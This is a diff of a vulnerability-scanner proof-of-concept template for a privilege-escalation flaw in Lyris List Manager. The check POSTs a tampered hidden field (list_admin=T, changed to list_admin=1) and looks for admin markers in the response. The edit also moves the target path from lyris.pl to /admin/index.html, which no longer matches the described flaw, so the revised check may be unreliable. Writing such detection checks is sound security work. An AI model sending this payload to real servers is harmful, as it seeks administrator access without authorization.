@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "通过向 lyris.pl 提交 list_admin=T 参数验证 Lyris List Manager 隐藏表单字段操纵漏洞。攻击者将原本为 F 的 list_admin 隐藏字段改为 T 后提交，若服务端未校验则该请求可获取管理员权限。"
+description = "通过篡改隐藏表单字段 list_admin 验证是否能绕过权限校验获取管理权限"
 id = "POC-AVE-2000-0903"
-name = "Lyris List Manager list_admin Hidden Field Privilege Escalation PoC"
+name = "Lyris List Manager Administration Hole PoC"
 severity = "medium"
 tags = ["ave-2000-0903"]
 vuln_id = [
@@ -15,11 +15,11 @@ logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/lyris.pl"
+path = "/{{BaseURL}}/admin/index.html"
 protocol = "http"
 
 [poc.requests.body]
-content = "list_admin=T"
+content = "list_admin=1"
 type = "raw"
 
 [poc.requests.headers]
@@ -30,7 +30,6 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "admin",
     "Administrator",
-    "list_admin",
+    "Admin Control Panel",
 ]
